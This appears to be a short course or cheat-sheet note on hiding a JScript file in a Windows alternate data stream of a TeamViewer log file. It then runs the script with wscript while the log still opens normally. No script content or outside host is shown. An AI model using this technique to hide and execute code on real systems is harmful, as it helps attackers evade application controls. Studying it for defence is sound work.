# Alternate Data Streams - Basic Bypass

An Alternate Data Stream (ADS) is a binary file attribute that contains metadata. 

We can leverage this to append the binary data of additional streams to the original file.

Example :

```bash
C:\>type test.js > "C:\Program Files( (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"

C:\>dir /r "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log"

TeamViewer12_Logfile.log:test.js:$DATA

```

If we double click the icon for the log file, it would open the log in Notepad as a standard log file.

But if we execute it from the command line with "wscript", specifying the ADS, the Jscript content is executed.

```cmd.exe

C:\Users\student>wscript "C:\Program Files( (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"

```
